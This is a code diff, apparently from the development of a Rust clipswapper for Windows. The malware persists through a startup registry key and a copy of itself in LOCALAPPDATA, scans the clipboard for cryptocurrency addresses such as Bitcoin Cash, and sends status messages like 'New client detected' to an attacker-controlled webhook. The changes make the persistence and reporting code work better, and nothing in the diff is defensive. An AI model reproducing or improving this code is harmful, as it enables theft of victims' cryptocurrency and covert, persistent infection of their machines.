@@ -9,7 +9,7 @@ use std::{
     fs::{copy, create_dir_all},
     io,
     os::windows::prelude::OsStrExt,
-    path::PathBuf,
+    path::{PathBuf, Path},
     ptr::null_mut,
     str::FromStr,
     thread,
@@ -45,6 +45,11 @@ fn add_to_startup_registry(path: String) -> io::Result<()> {
     key.set_value(FILE_NAME, &path)
 }
 
+fn file_exists(file_path: &PathBuf) -> bool {
+    file_path.exists() && file_path.is_file()
+}
+
+
 fn get_destination_path() -> (PathBuf, PathBuf) {
     let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(FOLDER_NAME);
 
@@ -54,15 +59,19 @@ fn get_destination_path() -> (PathBuf, PathBuf) {
     )
 }
 
-fn persistence() -> io::Result<()> {
+async fn persistence() -> io::Result<()> {
     let current_path = env::current_exe()?;
 
     let (file_path, folder_path) = get_destination_path();
 
     match add_to_startup_registry(file_path.to_str().unwrap().to_string()) {
         Ok(..) => {
-            create_dir_all(&folder_path)?;
-            copy(current_path, file_path)?;
+            if !file_exists(&file_path) {
+                create_dir_all(&folder_path)?;
+                copy(current_path, file_path)?;
+            } else {
+                send_webhook("New client detected".to_string()).await;
+            }
         }
         Err(..) => {}
     };
@@ -100,11 +109,11 @@ fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
 }
 
 #[allow(unused_must_use)]
-async fn webhook_new_paste(to: String) -> () {
+async fn send_webhook(content: String) -> () {
     let client = reqwest::Client::new();
-    let payload = format!(r#"{{ "content": "Copied {} address" }}"#, to);
+    let payload = format!(r#"{{ "content": "{}" }}"#, content);
 
-    let res = client
+    client
         .post(WEBHOOK)
         .header("Content-Type", "application/json")
         .body(payload)
@@ -160,12 +169,12 @@ async fn main() {
             (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
         ]);
 
-        match persistence() {
+        match persistence().await {
             Ok(..) => loop {
                 let scan_res = scan(&map);
 
                 if scan_res.is_some() {
-                    webhook_new_paste(scan_res.unwrap().1).await;
+                    send_webhook("Copied to clipboard".to_string()).await;
                 }
 
                 thread::sleep(Duration::from_millis(100));
